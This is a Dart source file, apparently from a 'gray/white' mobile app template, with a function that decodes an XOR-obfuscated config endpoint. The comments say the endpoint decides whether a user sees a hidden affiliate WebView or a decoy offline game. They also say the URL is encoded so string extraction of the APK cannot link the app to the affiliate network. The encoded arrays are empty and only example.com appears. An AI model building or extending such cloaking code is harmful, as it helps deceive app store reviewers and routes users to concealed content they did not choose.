import '../utils/codec.dart';

// ============================================================
// NET INFO — Obfuscated config endpoint URL
// ============================================================
// The config endpoint is the backend URL that decides whether
// a user gets the WebView (online/gray) experience or the game
// (offline/white) experience.
//
// The URL is XOR-encoded so it doesn't appear in plaintext
// in the APK binary (prevents grep/strings extraction).
//
// HOW TO ENCODE:
//   1. Get the endpoint URL from your manager
//   2. Fill it in tool/encode_keys.dart
//   3. Run: dart run tool/encode_keys.dart
//   4. Copy the printed host/path arrays below
//
// SECURITY NOTE: The endpoint domain is the most sensitive value
// in the binary — it links this app to the affiliate network.
// Keep it encoded. Never log it in release builds.
// ============================================================

/// Returns the decoded full config endpoint URL.
/// This is the POST endpoint that returns {ok, url, expires}.
///
/// TODO: Encode your endpoint using tool/encode_keys.dart.
/// Split the URL into host and path for better obfuscation.
/// Example split:
///   Full URL: https://api.example.com/v1/config
///   host bytes → decode to: https://api.example.com
///   path bytes → decode to: /v1/config
String resolveEndpoint() {
  // TODO: Replace with encoded byte arrays from tool/encode_keys.dart
  const h = <int>[];
  const p = <int>[];
  if (h.isEmpty) return '';
  return d(h) + d(p);
}
